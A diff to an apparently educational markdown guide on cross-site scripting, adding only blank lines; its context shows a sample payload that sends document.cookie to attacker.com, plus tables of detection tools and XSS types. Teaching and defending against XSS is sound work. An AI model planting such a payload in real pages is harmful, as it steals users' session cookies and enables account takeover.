@@ -102,6 +102,7 @@ fetch("https://example.com/logout");
 fetch("https://attacker.com/steal?session=" + document.cookie);
 </script>
 ```  
+
 <br>
 
 ## 4. Mitigating XSS
@@ -152,6 +153,7 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 | OWASP ZAP | Open-source tool to detect XSS and other web vulnerabilities. |
 | Acunetix | Comprehensive security scanner for web applications. |
 | DOM Snitch | A Chrome extension to detect DOM-based XSS vulnerabilities. |  
+
 <br>
 
 ## 6. Summary of XSS Types
@@ -161,6 +163,7 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure
 | Reflected XSS | Malicious script is reflected off the server and executed in the victim’s browser. | Payload in URL query parameters. |
 | Persistent XSS | Malicious script is stored on the server and served to all users viewing the affected resource. | Injected into comment fields or user profiles. |
 | DOM-Based XSS | Malicious script is executed in the client’s browser without server involvement. | Exploits insecure JavaScript like innerHTML or location.hash. |  
+
 <br>
 
 ## 7. Best Practices to Prevent XSS
